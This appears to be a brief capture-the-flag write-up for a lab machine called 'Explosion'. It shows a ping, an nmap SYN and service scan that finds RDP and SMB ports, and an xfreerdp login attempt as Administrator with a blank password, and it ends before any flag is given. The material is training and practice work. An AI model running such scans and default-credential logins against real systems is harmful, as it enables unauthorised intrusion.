# Explosion 

```
┌──(kali㉿kali)-[~/Downloads]
└─$ ping 10.129.61.167
PING 10.129.61.167 (10.129.61.167) 56(84) bytes of data.
64 bytes from 10.129.61.167: icmp_seq=1 ttl=127 time=25.6 ms
64 bytes from 10.129.61.167: icmp_seq=2 ttl=127 time=51.5 ms
^C
--- 10.129.61.167 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 25.648/38.566/51.484/12.918 ms
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sS -sV -v 10.129.61.167 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 19:43 EDT
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 19:43
Scanning 10.129.61.167 [4 ports]
Completed Ping Scan at 19:43, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:43
Completed Parallel DNS resolution of 1 host. at 19:43, 0.01s elapsed
Initiating SYN Stealth Scan at 19:43
Scanning 10.129.61.167 [1000 ports]
Discovered open port 3389/tcp on 10.129.61.167
Discovered open port 139/tcp on 10.129.61.167
Discovered open port 445/tcp on 10.129.61.167
Discovered open port 135/tcp on 10.129.61.167
Completed SYN Stealth Scan at 19:43, 0.52s elapsed (1000 total ports)
Initiating Service scan at 19:43
Scanning 4 services on 10.129.61.167
Completed Service scan at 19:43, 13.77s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.61.167.
Initiating NSE at 19:43
Completed NSE at 19:43, 0.00s elapsed
Initiating NSE at 19:43
Completed NSE at 19:43, 0.07s elapsed
Nmap scan report for 10.129.61.167
Host is up (0.026s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.83 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.056KB)
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ xfreerdp /v:10.129.61.167:3389 /u:Administrator
[19:50:29:953] [81817:81818] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[19:50:29:953] [81817:81818] [WARN][com.freerdp.crypto] - CN = Explosion
Password: 
[19:50:33:224] [81817:81818] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[19:50:33:225] [81817:81818] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[19:50:33:261] [81817:81818] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[19:50:33:261] [81817:81818] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[19:50:34:605] [81817:81818] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
```

![image](https://github.com/user-attachments/assets/0c41bf68-cbc0-434a-89ff-39ccda499f5f)


Flag in the file : 
